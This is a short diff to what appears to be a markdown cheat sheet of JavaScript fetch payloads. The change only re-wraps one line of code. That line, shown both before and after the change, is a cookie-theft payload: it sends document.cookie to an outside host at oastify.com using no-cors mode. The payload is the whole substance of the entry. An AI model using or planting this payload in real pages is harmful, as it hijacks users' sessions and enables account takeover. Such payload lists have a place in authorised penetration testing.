@@ -200,7 +200,8 @@ fetch('/foo', {credentials: "include"})
 - fetch 
     - GET
         ```js
-        fetch("https://oastify.com/steal?cookie=" + document.cookie, {mode: 'no-cors'});
+        fetch("https://oastify.com/steal?cookie=" + document.cookie, 
+            {mode: 'no-cors'});
         ```
 
     - POST 
